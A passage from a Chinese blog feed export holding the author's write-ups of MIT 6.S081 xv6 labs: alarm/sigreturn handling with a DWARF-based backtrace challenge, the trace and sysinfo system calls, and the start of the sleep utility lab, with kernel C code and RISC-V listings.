<li><p>我们实际在处理sigalarm时，首先需要将<code>sigalarm</code>和<code>sigalarmret</code>函数处理加入到<code>system call</code>中，然后在处理<code>usertrap</code>时，首先我们需要处理来自<code>timer</code>的trap,此时我们可以将<code>trap</code>恢复后的<code>pc</code>指向<code>alarmhandler</code>函数，我们运行时，即可发现可以运行<code>handler</code>函数，但是运行完成后，发现出了不少问题。我们仔细思考就可以发现，因为<code>PC</code>指向的指令地址改变后，我们可以仔细分析一下，函数执行时，我们看到当前栈帧返回时会返回正确的地址，因为此时<code>RA</code>寄存器存放的为正确的return address.但是periodic函数在执行过程中可能会将其中的寄存器污染，所以会出现<code>alarm</code>打印逻辑出错。所以我们在执行<code>handler</code>时，必须要将相关的寄存器进行保存，保存完成后再执行<code>handler</code>，执行完成<code>handler</code>后，我们再恢复寄存器，同时恢复<code>pc</code>.</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">periodic()</span><br><span class="line">&#123;</span><br><span class="line">   0:	1141                	addi	sp,sp,-16</span><br><span class="line">   2:	e406                	sd	ra,8(sp)</span><br><span class="line">   4:	e022                	sd	s0,0(sp)</span><br><span class="line">   6:	0800                	addi	s0,sp,16</span><br><span class="line">  count = count + 1;</span><br><span class="line">   8:	00001797          	auipc	a5,0x1</span><br><span class="line">   c:	d407a783          	lw	a5,-704(a5) # d48 &lt;count&gt;</span><br><span class="line">  10:	2785                	addiw	a5,a5,1</span><br><span class="line">  12:	00001717          	auipc	a4,0x1</span><br><span class="line">  16:	d2f72b23          	sw	a5,-714(a4) # d48 &lt;count&gt;</span><br><span class="line">  printf(&quot;alarm!\n&quot;);</span><br><span class="line">  1a:	00001517          	auipc	a0,0x1</span><br><span class="line">  1e:	b6650513          	addi	a0,a0,-1178 # b80 &lt;malloc+0xea&gt;</span><br><span class="line">  22:	00001097          	auipc	ra,0x1</span><br><span class="line">  26:	9b6080e7          	jalr	-1610(ra) # 9d8 &lt;printf&gt;</span><br><span class="line">  sigreturn();</span><br><span class="line">  2a:	00000097          	auipc	ra,0x0</span><br><span class="line">  2e:	6c6080e7          	jalr	1734(ra) # 6f0 &lt;sigreturn&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li><p>刚开始我的想法是再申请一个物理页，然后用汇编将所有的寄存器的值，都保存到这个新申请的物理页中，待到函数执行完成后，我们再利用系统调用，将该物理页中保存的值再重新加载到寄存器中，刚开始想着是模仿<code>userret</code>和<code>uservec</code>的汇编代码来模仿实现。后来感觉太复杂了，看了提示之后，在进入<code>alarm handler</code>之前所有的寄存器其实都已经全部保存在tramp fram中，我们可以申请新的tramp fram结构，在<code>usertrapret</code>恢复寄存器时，暂时不恢复寄存器的值，只是将<code>PC</code>的值进行跳转。在<code>alarmreturn</code>时，此时我们再将已经保存的tramp fram中的寄存器和<code>PC</code>的值全部切换回去即可。</p>
</li>
</ul>
<ol>
<li><code>alarm</code>时，我们将handler和interval进行指定保存。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigalarm</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> ticks;</span><br><span class="line">    uint64 ptr;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">proc</span> * p = <span class="built_in">myproc</span>();	</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">argint</span>(<span class="number">0</span>, &amp;ticks) &lt; <span class="number">0</span>)</span><br><span class="line">    	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="built_in">argaddr</span>(<span class="number">1</span>,&amp;ptr) &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	</span><br><span class="line">  </span><br><span class="line">	<span class="built_in">acquire</span>(&amp;p-&gt;lock);</span><br><span class="line">	p-&gt;alarmworking = <span class="number">0</span>;</span><br><span class="line">	p-&gt;alarminterval = ticks;</span><br><span class="line">	p-&gt;alarmhandler = (func)ptr;</span><br><span class="line">	<span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>执行trap时，如果当前的ticks达到<code>alarminterval</code>时，则我们首先将<code>PC</code>的返回值替换为<code>handler</code>的入口地址，同时将当前<code>trap frame</code>的值进行保存。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// give up the CPU if this is a timer interrupt.</span></span><br><span class="line">  <span class="keyword">if</span>(which_dev == <span class="number">2</span>)&#123;</span><br><span class="line">  	<span class="keyword">if</span>(!p-&gt;alarmworking &amp;&amp; p-&gt;alarminterval &gt; <span class="number">0</span>)&#123;</span><br><span class="line">	  p-&gt;alarmtick++;</span><br><span class="line">	  <span class="keyword">if</span>(p-&gt;alarmtick == p-&gt;alarminterval)&#123;</span><br><span class="line">		<span class="comment">//p-&gt;alarmhandler();</span></span><br><span class="line">		<span class="comment">//p-&gt;alarmretaddr = p-&gt;trapframe-&gt;epc;</span></span><br><span class="line">		<span class="comment">// we set the epc point  to the alarm handler</span></span><br><span class="line">		<span class="comment">// when we leave from the trap process,we will get to the alarm handler</span></span><br><span class="line">		<span class="built_in">memmove</span>(&amp;p-&gt;alarmtrap,p-&gt;trapframe,<span class="built_in">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">		p-&gt;trapframe-&gt;epc = (uint64)p-&gt;alarmhandler;</span><br><span class="line">	    p-&gt;alarmtick = <span class="number">0</span>;</span><br><span class="line">		p-&gt;alarmworking = <span class="number">1</span>;</span><br><span class="line">	  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	</span><br><span class="line">    <span class="built_in">yield</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure></li>
<li>执行<code>sigreturn</code>时，则我们将保存的<code>tramfram</code>切换回去即可。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">uint64 <span class="title">sys_sigreturn</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">proc</span> * p = <span class="built_in">myproc</span>();</span><br><span class="line">	<span class="keyword">if</span>(p-&gt;alarmworking)&#123;</span><br><span class="line">		<span class="built_in">memmove</span>(p-&gt;trapframe,&amp;p-&gt;alarmtrap,<span class="built_in">sizeof</span>(<span class="keyword">struct</span> trapframe));</span><br><span class="line">	    p-&gt;alarmworking = <span class="number">0</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<h2 id="Optional-challenge"><a href="#Optional-challenge" class="headerlink" title="Optional challenge"></a>Optional challenge</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Print the names of the functions and line numbers in backtrace() instead of numerical addresses</span><br></pre></td></tr></table></figure>
<p>按照要求对<code>backtrace</code>进行扩展，使得其能够打印出相应的文件和行号，刚开始拿到这个以为很简单，但是实际上实现起来还是挺复杂。主要查找的信息来源于<code>addr2line</code>的实现，在github上找了一堆实现<code>addr2line</code>的代码，后来发现一个<code>c++</code>还凑合，就拿过来读了一下，然后通过查找<code>debug_line</code>的具体参数定义，然后找到dwarf 3.0的标准，对战标准和代码把相关的功能全部重新移植到xv6上，虽然代码写的很烂，但是凑合还能用吧，其中<code>debug</code>的时间还挺长。具体实现原理如下：</p>
<ol>
<li>改写makefile,把生成kernel的elf文件做到文件系统中，然后系统运行后，通过用户进程调用函数读取和解析elf文件，这里最大的坑是用户进程未初始化时，我直接用内核读取文件，发现会<code>panic</code>,后来仔细检查了很多遍，发现因为在内核文件的读取都会加载进程的文件锁，而这时用户进行还未初始化，这时如果去调用mypoc函数就会出现指针跑飞的问题。解决办法只有等待用户进行调度起来后，可以单独起一个用户进程读取和解析elf文件。</li>
<li>系统起来后，在内核空间中从文件系统读取elf文件，找到.debug_line这个section，然后按照dwarf 3.0的标准来解析header和opcode，具体可以Google相关的标准，标准本身还是挺复杂的，具体实现时参考这个github的代码：<a href="https://github.com/evmar/maddr">https://github.com/evmar/maddr</a> ，里面解析opcode时有不少小bug，关键时刻还算看标准靠谱。</li>
<li>解析完成后，将解析生成的matrix放入到数组中，然后我们对line table按照地址从小到大进行排序，我们解析的line table中也可以看到每行代码可能会对应多个<code>instruction</code>，我们直到<code>pc</code>每次递增的。每次进行查询时，我们在line table表中查找小于等于等于给定地址p的第一个元素，然后返回查询结果即可，查询结果包含了文件名和行号，返回给trace即可。</li>
<li>熬了几天夜，终于把功能基本实现了，总体来说还算非常蛋疼的功能。<br><img src="https://i.loli.net/2021/08/20/hlpDCfavUjYydiR.png"></li>
</ol>
<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】 lab2 systemcalls</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/65/</url>
    <content><![CDATA[<h1 id="systemcalls"><a href="#systemcalls" class="headerlink" title="systemcalls"></a>systemcalls</h1><p>最近工作太忙了，好久没有时间更新学习进度了，本周还是抽时间把<code>lab2</code>的内容作完了，<code>lab2</code>的难度感觉比<code>lab1</code>小多了，主要是为系统添加两个<code>system call</code>，总体来说难度偏低。</p>
<ul>
<li>首先我们可以观察到，所有的系统调用函数都存放在<code>usys.S</code>中，用<code>risc-v</code>的指令完成。在用户空间中调用系统调用函数<code>func</code>，实际内核中对应的就是系统调用对应的<code>id</code>写入到寄存器<code>a7</code>，然后调用<code>ecall</code>指令，即在内核中可调用对应的函数。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta"># generated by usys.pl - do not edit</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;kernel/syscall.h&quot;</span></span></span><br><span class="line">.global fork</span><br><span class="line">fork:</span><br><span class="line"> li a7, SYS_fork</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global exit</span><br><span class="line">exit:</span><br><span class="line"> li a7, SYS_exit</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global wait</span><br><span class="line">wait:</span><br><span class="line"> li a7, SYS_wait</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global pipe</span><br><span class="line">pipe:</span><br><span class="line"> li a7, SYS_pipe</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global read</span><br><span class="line">read:</span><br><span class="line"> li a7, SYS_read</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global write</span><br><span class="line">write:</span><br><span class="line"> li a7, SYS_write</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global close</span><br><span class="line">close:</span><br><span class="line"> li a7, SYS_close</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global kill</span><br><span class="line">kill:</span><br><span class="line"> li a7, SYS_kill</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global exec</span><br><span class="line">exec:</span><br><span class="line"> li a7, SYS_exec</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global open</span><br><span class="line">open:</span><br><span class="line"> li a7, SYS_open</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global mknod</span><br><span class="line">mknod:</span><br><span class="line"> li a7, SYS_mknod</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global unlink</span><br><span class="line">unlink:</span><br><span class="line"> li a7, SYS_unlink</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global fstat</span><br><span class="line">fstat:</span><br><span class="line"> li a7, SYS_fstat</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global link</span><br><span class="line">link:</span><br><span class="line"> li a7, SYS_link</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global mkdir</span><br><span class="line">mkdir:</span><br><span class="line"> li a7, SYS_mkdir</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global chdir</span><br><span class="line">chdir:</span><br><span class="line"> li a7, SYS_chdir</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global dup</span><br><span class="line">dup:</span><br><span class="line"> li a7, SYS_dup</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global getpid</span><br><span class="line">getpid:</span><br><span class="line"> li a7, SYS_getpid</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global sbrk</span><br><span class="line">sbrk:</span><br><span class="line"> li a7, SYS_sbrk</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global sleep</span><br><span class="line">sleep:</span><br><span class="line"> li a7, SYS_sleep</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global uptime</span><br><span class="line">uptime:</span><br><span class="line"> li a7, SYS_uptime</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global trace</span><br><span class="line">trace:</span><br><span class="line"> li a7, SYS_trace</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br><span class="line">.global sysinfo</span><br><span class="line">sysinfo:</span><br><span class="line"> li a7, SYS_sysinfo</span><br><span class="line"> ecall</span><br><span class="line"> ret</span><br></pre></td></tr></table></figure>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// System call numbers</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_fork    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_exit    2</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_wait    3</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_pipe    4</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_read    5</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_kill    6</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_exec    7</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_fstat   8</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_chdir   9</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_dup    10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_getpid 11</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sbrk   12</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sleep  13</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_uptime 14</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_open   15</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_write  16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_mknod  17</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_unlink 18</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_link   19</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_mkdir  20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_close  21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_trace  22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sysinfo 23</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li>在内核中我们可以看到实际的系统调用内核中执行如下:<br>从<code>a7</code>寄存器中取出系统调用号，然后执行对应的内核中的函数,系统调用函数可能会从用户空间中取出传入的参数，然后将执行的返回结果再写回到用户空间中。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  </span><br><span class="line">  <span class="comment">// system call number</span></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; <span class="built_in">NELEM</span>(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;tracemask &amp; (<span class="number">1</span>&lt;&lt;num))&#123;</span><br><span class="line">        <span class="comment">// printf(&quot;sys call num = %d\n&quot;,num);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscallname[num],p-&gt;trapframe-&gt;a0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>如果我们需要添加系统调用，则首先添加系统调用的编号，然后在内核中添加系统调用编号对应的回调函数即可。</li>
<li>测试结果：<br><img src="https://i.loli.net/2021/07/02/WGBDQaPhdVY54Nk.png"></li>
</ul>
<h2 id="1-trace"><a href="#1-trace" class="headerlink" title="1. trace"></a>1. trace</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this assignment you will add a system call tracing feature that may help you when debugging later labs. You’ll create a new trace system call that will control tracing. It should take one argument, an integer “mask”, whose bits specify which system calls to trace. For example, to trace the fork system call, a program calls trace(1 &lt;&lt; SYS_fork), where SYS_fork is a syscall number from kernel/syscall.h. You have to modify the xv6 kernel to print out a line when each system call is about to return, if the system call’s number is set in the mask. The line should contain the process id, the name of the system call and the return value; you don’t need to print the system call arguments. The trace system call should enable tracing for the process that calls it and any children that it subsequently forks, but should not affect other processes.</span><br></pre></td></tr></table></figure>
<p>实现系统调用的<code>trace</code>功能，即打印出进程中每一个在<code>mask</code>掩码中的系统调用，并且子进程会继承父进程的<code>mask</code>.</p>
<ul>
<li>代码实现本身不是特别难，主要是需要弄清楚系统的调用的过程。我们首先添加系统调用编号<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_close  21</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_trace  22</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYS_sysinfo 23</span></span><br></pre></td></tr></table></figure>
在用户程序中添加如下:<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="built_in">entry</span>(<span class="string">&quot;sleep&quot;</span>);</span><br><span class="line"><span class="built_in">entry</span>(<span class="string">&quot;uptime&quot;</span>);</span><br><span class="line"><span class="built_in">entry</span>(<span class="string">&quot;trace&quot;</span>);</span><br><span class="line"><span class="built_in">entry</span>(<span class="string">&quot;sysinfo&quot;</span>);</span><br></pre></td></tr></table></figure>
在进程的结构体中增加<code>tracemask</code>变量，在<code>systemcall</code>函数中需要修改，每次进行系统调用时，则将系统调用号与掩码进行比对，是否存在于掩码的状态中，如果掩码存在，则此时我们打印出系统调用的具体信息。本身不是特别难。<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">syscall</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> num;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line"></span><br><span class="line">  num = p-&gt;trapframe-&gt;a7;</span><br><span class="line">  <span class="keyword">if</span>(num &gt; <span class="number">0</span> &amp;&amp; num &lt; <span class="built_in">NELEM</span>(syscalls) &amp;&amp; syscalls[num]) &#123;</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = syscalls[num]();</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;tracemask &amp; (<span class="number">1</span>&lt;&lt;num))&#123;</span><br><span class="line">        <span class="comment">// printf(&quot;sys call num = %d\n&quot;,num);</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>,p-&gt;pid,syscallname[num],p-&gt;trapframe-&gt;a0);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %s: unknown sys call %d\n&quot;</span>,</span><br><span class="line">            p-&gt;pid, p-&gt;name, num);</span><br><span class="line">    p-&gt;trapframe-&gt;a0 = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// system trace call, using trace mask to print system call information</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">trace</span><span class="params">(<span class="type">int</span> mask)</span></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  p-&gt;tracemask = mask;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="2-sysinfo"><a href="#2-sysinfo" class="headerlink" title="2. sysinfo"></a>2. sysinfo</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">In this assignment you will add a system call, sysinfo, that collects information about the running system. The system call takes one argument: a pointer to a struct sysinfo (see kernel/sysinfo.h). The kernel should fill out the fields of this struct: the freemem field should be set to the number of bytes of free memory, and the nproc field should be set to the number of processes whose state is not UNUSED. We provide a test program sysinfotest; you pass this assignment if it prints “sysinfotest: OK”.</span><br></pre></td></tr></table></figure>
<p>完成<code>sysinfo</code>系统调用，主要时获取当前<code>heap</code>中的<code>free</code>的总空间，同时获取当前系统中存在多少非空闲的进程个数。这个也比较简单，难点在于学会将内核空间的数据拷贝到用户空间。</p>
<ul>
<li>系统调用添加的流程跟<code>trace</code>是一样的，稍微复杂点即是需要在<code>kalloc.c</code>中添加对<code>free memory</code>的统计，以及在<code>proc</code>中添加对空闲进程的统计。</li>
<li><code>kalloc</code>中我们可以看到所有的<code>memory free</code>是用<code>list</code>表示的，每一块空闲的内存大小为<code>4096 byte</code>，我们只需要遍历<code>freelist</code>统计块的数目即可。</li>
<li><code>proc</code>中我们可以看到每一个<code>process</code>都有一个状态，我们只需要检测<code>process</code>的状态即可，<code>process</code>列表用数组表示，我们只需要遍历数组即可。</li>
<li>关键的一点，获取参数以后，需要将所有的参数信息从内核空间拷贝到用户空间即可，这时需要用到<code>copyout</code>函数.<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">sysinfo</span><span class="params">(uint64 addr)</span></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p = <span class="built_in">myproc</span>();</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">sysinfo</span> st;</span><br><span class="line"></span><br><span class="line">  st.freemem = <span class="built_in">totalfree</span>();</span><br><span class="line">  st.nproc   = <span class="built_in">nproc</span>();</span><br><span class="line">  <span class="comment">// printf(&quot;total free: %d\n&quot;,st.freemem);</span></span><br><span class="line">  <span class="comment">// printf(&quot;total proc：%d\n&quot;,st.nproc);</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="built_in">copyout</span>(p-&gt;pagetable, addr, (<span class="type">char</span> *)&amp;st, <span class="built_in">sizeof</span>(st)) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">// system information null process number.</span></span><br><span class="line"><span class="function">uint64 <span class="title">nproc</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  uint64 tot = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">proc</span> *p;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="built_in">acquire</span>(&amp;p-&gt;lock);</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">      tot++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">release</span>(&amp;p-&gt;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">uint64 <span class="title">totalfree</span><span class="params">(<span class="type">void</span>)</span></span>&#123;</span><br><span class="line">  uint64 tot = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">run</span> *r;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Get totall free memory</span></span><br><span class="line">  <span class="built_in">acquire</span>(&amp;kmem.lock);</span><br><span class="line">  r = kmem.freelist;</span><br><span class="line">  <span class="keyword">while</span>(r)&#123;</span><br><span class="line">    tot += <span class="number">4096</span>;</span><br><span class="line">    r = r-&gt;next;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">release</span>(&amp;kmem.lock);</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> tot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://mikemeng.org/">http://mikemeng.org/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://i.loli.net/2020/11/16/xtyDOgT6Gm1AKdS.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>MIT6.S081</category>
      </categories>
      <tags>
        <tag>公开课学习</tag>
      </tags>
  </entry>
  <entry>
    <title>【MIT6.S081】lab1 utils</title>
    <url>/2022/11/20/%E5%85%AC%E5%BC%80%E8%AF%BE%E5%AD%A6%E4%B9%A0/66/</url>
    <content><![CDATA[<h1 id="MIT6-S081"><a href="#MIT6-S081" class="headerlink" title="MIT6.S081"></a>MIT6.S081</h1><p>很早就听说MIT6.S081的课程比较经典了，所以从上周末就开始学习MIT6.S081的<code>lecture</code>,目前刚学习完<code>lecture 1</code>，并且成功完成了<code>lab1</code>，不得不说<code>lab</code>太花费时间了，<code>lab</code>设置的非常好，难度适中，有挑战性与趣味性并存，非常感谢这么好与经典的课程，不过不得不说因为确实平时没有时间，又要照顾家庭，又要上班，只能利用周末和晚上的时间抓紧来学习和完成这些<code>lab</code>的代码了，每次都需要花时间调试代码调试很长时间，目测后面的挑战题目更难。<code>MIT</code>的课程难度一向很大，难怪能够培养出很多非常优秀和出色的工程师。</p>
<ul>
<li>lab环境：<br>所有的<code>lab</code>都是基于<code>qemu</code>的模拟硬件环境的，它的所有的<code>lab</code>全部更新为基于<code>risc-v</code>的硬件环境，紧跟最新的潮流，不像国内一个<code>8086</code>都还在讲，恨不得一门组成原理用了不知道多少年，目前还在停留在单核的x86时代，目前几乎所有的通用<code>cpu</code>都是基于多核处理器，所有的体系结构都应该更新了。所有的<code>lab</code>都是基于<code>xv6</code>的操作系统，一个非常精简的微小的操作系统。按照<code>lab</code>的提示从网上下载<code>qemu</code>模拟器和<code>risc-v</code>的编译环境，国内尽量将<code>apt-get</code>的源改为阿里或者清华的，很快就能完成下载。</li>
<li>测试结果：<br><img src="https://i.loli.net/2021/06/07/IQJYxFsA52fdEo3.png"></li>
</ul>
<h2 id="1-sleep"><a href="#1-sleep" class="headerlink" title="1. sleep"></a>1. sleep</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Implement the UNIX program sleep for xv6; your sleep should pause for a user-specified number of ticks. A tick is a notion of time defined by the xv6 kernel, namely the time between two interrupts from the timer chip. Your solution should be in the file user/sleep.c.</span><br></pre></td></tr></table></figure>
<p>实现一个基本的<code>sleep</code>命令，这个基本上就是热身，通过最简单的题目来快速上手，实现一个最简单的程序，没有多少难度。</p>
